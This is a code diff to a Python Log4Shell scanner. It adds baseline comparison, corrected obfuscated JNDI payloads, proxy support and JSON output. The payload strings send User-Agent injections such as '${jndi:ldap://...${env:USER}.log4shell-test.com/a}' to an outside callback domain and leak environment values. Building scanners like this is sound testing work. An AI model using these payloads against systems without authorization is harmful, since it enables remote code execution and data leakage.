@@ -31,7 +31,9 @@ from mytools.core.utils import (
     color,
     create_async_client,
     create_banner,
+    init_scanner,
     print_exploit_info,
+    print_json,
     run_main_loop,
     safe_asyncio_run,
     write_output,
@@ -103,10 +105,14 @@ async def _test_baseline(
 async def _test_jndi_basic(
     client: httpx.AsyncClient,
     url: str,
+    baseline: tuple[int, int, dict[str, str], bytes] | None = None,
 ) -> list[Log4ShellAttempt]:
     """Testa payloads JNDI basicos."""
     results: list[Log4ShellAttempt] = []
-    _b_status, _b_size, _b_headers, _b_body = await _test_baseline(client, url)
+    if baseline is None:
+        baseline = await _test_baseline(client, url)
+    _b_status, _b_size, _b_headers, _b_body = baseline
+    baseline_lower = _b_body.decode("utf-8", errors="ignore").lower()
 
     test_cases: list[tuple[str, str, str]] = [
         ("ldap_basic", "User-Agent", _build_jndi_payload("ldap", _get_token())),
@@ -129,7 +135,9 @@ async def _test_jndi_basic(
             if payload.lower() in resp_body.lower():
                 vulnerable = True
                 details = "JNDI payload refletido no body"
-            elif "log4j" in resp_body.lower() or "jndi" in resp_body.lower():
+            elif ("log4j" in resp_body.lower() or "jndi" in resp_body.lower()) and (
+                "log4j" not in baseline_lower and "jndi" not in baseline_lower
+            ):
                 vulnerable = True
                 details = "Possivel log4j detectado na resposta"
 
@@ -185,11 +193,15 @@ async def _test_jndi_obfuscated(
             "User-Agent",
             "${j${}ndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
         ),
-        ("ldap_envvar", "User-Agent", "${jndi:${env:USER}.log4shell-test.com/a}"),
+        (
+            "ldap_envvar",
+            "User-Agent",
+            "${jndi:ldap://" + _get_token() + ".${env:USER}.log4shell-test.com/a}",
+        ),
         (
             "ldap_proplookup",
             "User-Agent",
-            "${jndi:${java:os.name}.log4shell-test.com/a}",
+            "${jndi:ldap://" + _get_token() + ".${java:os.name}.log4shell-test.com/a}",
         ),
         (
             "ldap_dollar",
@@ -566,19 +578,25 @@ async def run_scan(
     categories: list[str],
     timeout: float,
     output_file: str | None,
+    proxy: str | None = None,
+    json_output: bool = False,
 ) -> int:
     """Executa o scan de Log4Shell."""
     logger.info("Log4Shell scan para %s", target)
 
     tls = target.startswith("https://")
 
-    async with create_async_client(timeout=timeout) as client:
+    async with create_async_client(timeout=timeout, proxy=proxy) as client:
         all_attempts: list[Log4ShellAttempt] = []
         test_categories = categories if categories else list(_CATEGORY_MAP.keys())
 
+        baseline = None
+        if "jndi_basic" in test_categories:
+            baseline = await _test_baseline(client, target)
+
         for cat in test_categories:
             if cat == "jndi_basic":
-                all_attempts.extend(await _test_jndi_basic(client, target))
+                all_attempts.extend(await _test_jndi_basic(client, target, baseline))
             elif cat == "jndi_obfuscated":
                 all_attempts.extend(await _test_jndi_obfuscated(client, target))
             elif cat == "header_injection":
@@ -609,7 +627,10 @@ async def run_scan(
             else ("safe" if blocked_techs else "unknown"),
         )
 
-        print_results(result)
+        if json_output:
+            print_json(asdict(result))
+        else:
+            print_results(result)
         logger.info(
             "Log4Shell scan concluido: %d testes, %d vulneraveis",
             len(all_attempts),
@@ -673,6 +694,7 @@ def build_parser() -> argparse.ArgumentParser:
 
 def run_once(args: argparse.Namespace) -> int:
     """Executa um scan Log4Shell a partir de argumentos parseados."""
+    init_scanner(args)
     logger.info("Log4Shell scan iniciado para %s", args.url)
     categories: list[str] = []
     if getattr(args, "category", None) and args.category != "all":
@@ -683,6 +705,8 @@ def run_once(args: argparse.Namespace) -> int:
             categories=categories,
             timeout=getattr(args, "timeout", 10),
             output_file=getattr(args, "output", None),
+            proxy=getattr(args, "proxy", None),
+            json_output=getattr(args, "json_output", False),
         ),
     )
 
